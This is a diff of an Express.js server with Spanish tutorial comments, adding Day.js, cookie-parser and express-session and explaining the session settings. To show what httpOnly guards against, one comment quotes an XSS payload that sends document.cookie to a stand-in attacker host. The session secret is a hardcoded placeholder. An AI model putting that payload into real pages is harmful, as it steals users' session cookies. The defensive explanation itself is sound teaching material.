@@ -16,6 +16,76 @@
 // Express nos proporciona métodos para manejar rutas, peticiones y respuestas HTTP
 const express = require("express");
 
+// ============================================================================
+// IMPORTACIÓN DE UTILIDADES PARA FECHAS, COOKIES Y SESIONES
+// ============================================================================
+
+/*
+  Day.js: biblioteca para trabajar con fechas
+  -------------------------------------------
+  Day.js es una alternativa ligera a Moment.js que nos permite:
+  - Formatear fechas de forma legible
+  - Manipular fechas (sumar/restar días, meses, etc.)
+  - Comparar fechas
+  - Trabajar con diferentes idiomas/locales
+  
+  Es útil para mostrar fechas en formatos como: "22 de enero de 2026"
+*/
+const dayjs = require("dayjs");
+
+/*
+  Configuración del idioma español para Day.js
+  --------------------------------------------
+  require("dayjs/locale/es"): carga el paquete de idioma español
+  dayjs.locale("es"): establece español como idioma por defecto
+  
+  Esto hace que los nombres de meses y días se muestren en español:
+  - "January" → "enero"
+  - "Monday" → "lunes"
+*/
+require("dayjs/locale/es");
+dayjs.locale("es");
+
+/*
+  cookie-parser: middleware para trabajar con cookies
+  ---------------------------------------------------
+  Las cookies son pequeños archivos de texto que el navegador guarda
+  y envía con cada petición al servidor.
+  
+  Este middleware facilita:
+  - Leer cookies: req.cookies.nombreCookie
+  - Crear cookies: res.cookie('nombre', 'valor')
+  - Eliminar cookies: res.clearCookie('nombre')
+  
+  Usos comunes de cookies:
+  - Recordar preferencias del usuario (idioma, tema oscuro/claro)
+  - Mantener sesiones de usuario (usuario logueado)
+  - Tracking y análisis
+*/
+const cookieParser = require("cookie-parser");
+
+/*
+  express-session: middleware para manejar sesiones de usuario
+  -------------------------------------------------------------
+  Una sesión es un espacio de memoria en el servidor asociado a un usuario
+  específico que persiste entre diferentes peticiones HTTP.
+  
+  ¿Por qué necesitamos sesiones?
+  HTTP es "stateless" (sin estado): cada petición es independiente.
+  El servidor no "recuerda" quién eres entre peticiones.
+  
+  Las sesiones solucionan esto:
+  1. Usuario hace login → se crea una sesión con sus datos
+  2. En peticiones siguientes → el servidor "recuerda" quién es
+  
+  Usos comunes:
+  - Sistema de autenticación (saber quién está logueado)
+  - Carrito de compras
+  - Preferencias temporales del usuario
+  - Flujos multi-paso (formularios divididos en varios pasos)
+*/
+const session = require("express-session");
+
 // Importamos el módulo "path": una utilidad nativa de Node.js para trabajar con rutas de archivos
 // Nos ayuda a construir rutas de archivos de forma segura, independientemente del sistema operativo
 const path = require("path");
@@ -116,6 +186,142 @@ app.set("view engine", "ejs");
   Sin este middleware, req.body sería undefined
 */
 app.use(express.urlencoded({ extended: true }));
+
+// ============================================================================
+// MIDDLEWARE: PARSEO DE COOKIES
+// ============================================================================
+
+/*
+  cookie-parser: analiza las cookies enviadas por el navegador
+  ------------------------------------------------------------
+  Cuando el navegador hace una petición, envía las cookies en una cabecera HTTP.
+  Este middleware convierte ese texto en un objeto JavaScript accesible.
+  
+  Sin cookie-parser:
+  - req.headers.cookie = "usuario=juan; tema=oscuro"
+  
+  Con cookie-parser:
+  - req.cookies = { usuario: "juan", tema: "oscuro" }
+  
+  Mucho más fácil de usar!
+*/
+app.use(cookieParser());
+
+// ============================================================================
+// MIDDLEWARE: GESTIÓN DE SESIONES
+// ============================================================================
+
+/*
+  Configuración del sistema de sesiones
+  --------------------------------------
+  Este middleware crea y gestiona sesiones para cada usuario que visita
+  nuestra aplicación.
+  
+  ¿Cómo funciona?
+  1. Usuario visita por primera vez → se crea un ID único de sesión
+  2. Se envía una cookie al navegador con ese ID
+  3. En siguientes peticiones → el navegador envía la cookie
+  4. El servidor usa ese ID para recuperar los datos de la sesión
+  5. Los datos están disponibles en req.session
+  
+  Ejemplo de uso:
+  - Login: req.session.usuario = { nombre: "Juan", rol: "admin" }
+  - Verificar: if (req.session.usuario) { ... usuario logueado ... }
+  - Logout: req.session.destroy()
+*/
+app.use(
+  session({
+    /*
+      secret: clave secreta para firmar la cookie de sesión
+      -----------------------------------------------------
+      Esta clave se usa para encriptar el ID de sesión en la cookie.
+      Evita que alguien pueda falsificar cookies de sesión.
+      
+      IMPORTANTE: En producción, esta clave debe ser:
+      - Compleja y difícil de adivinar
+      - Guardada en variables de entorno (no en el código)
+      - Diferente para cada aplicación
+      
+      Ejemplo seguro: process.env.SESSION_SECRET
+    */
+    secret: "clave para sesiones",
+
+    /*
+      resave: ¿guardar la sesión en cada petición aunque no cambie?
+      -------------------------------------------------------------
+      - false (recomendado): solo guarda si la sesión fue modificada
+      - true: guarda en cada petición, incluso si no hubo cambios
+      
+      ¿Por qué false?
+      - Mejor rendimiento (menos escrituras en base de datos/memoria)
+      - Evita condiciones de carrera en peticiones concurrentes
+      - Solo actualizamos cuando realmente hay cambios
+    */
+    resave: false,
+
+    /*
+      saveUninitialized: ¿guardar sesiones vacías?
+      --------------------------------------------
+      Una sesión "no inicializada" es aquella que:
+      - Se creó (el usuario visitó la página)
+      - Pero NO se le asignó ningún dato (req.session.usuario = ...)
+      
+      - false (recomendado): no guardar sesiones vacías
+      - true: guardar todas las sesiones, incluso vacías
+      
+      ¿Por qué false?
+      - Ahorra espacio (no guardamos sesiones inútiles)
+      - Mejor privacidad (no rastreamos usuarios anónimos)
+      - Cumple con leyes de cookies/privacidad (GDPR)
+      - Solo creamos sesión cuando el usuario realmente la usa (ej: hace login)
+    */
+    saveUninitialized: false,
+
+    /*
+      cookie: configuración de la cookie de sesión
+      --------------------------------------------
+      Esta cookie se envía al navegador y contiene el ID de sesión
+    */
+    cookie: {
+      /*
+        httpOnly: protección contra ataques XSS
+        ----------------------------------------
+        - true: la cookie NO es accesible desde JavaScript del navegador
+        - false: accesible desde document.cookie
+        
+        ¿Por qué true?
+        Seguridad: si un atacante inyecta código JavaScript malicioso en tu
+        web (ataque XSS), NO podrá robar la cookie de sesión.
+        
+        Ejemplo de ataque evitado:
+        <script>fetch('https://atacante.com?cookie=' + document.cookie)</script>
+        Con httpOnly: true, esto NO funcionará para la cookie de sesión.
+      */
+      httpOnly: true,
+
+      /*
+        maxAge: tiempo de vida de la cookie en milisegundos
+        ---------------------------------------------------
+        Después de este tiempo, la cookie expira y la sesión se pierde.
+        El usuario tendrá que volver a hacer login.
+        
+        Cálculo:
+        - 1 segundo = 1000 milisegundos
+        - 1 minuto = 1000 ms × 60 = 60,000 ms
+        - 30 minutos = 60,000 ms × 30 = 1,800,000 ms
+        
+        Esta configuración: la sesión expira después de 30 minutos de
+        inactividad. Es común para aplicaciones que manejan datos sensibles.
+        
+        Otras opciones comunes:
+        - 1 día: 1000 × 60 × 60 × 24
+        - 1 semana: 1000 × 60 × 60 × 24 × 7
+        - Sin expiración: undefined (la sesión dura hasta cerrar navegador)
+      */
+      maxAge: 1000 * 60 * 30, // 30 minutos
+    },
+  })
+);
 
 // ============================================================================
 // MIDDLEWARE: TIMEOUT (TIEMPO DE ESPERA)
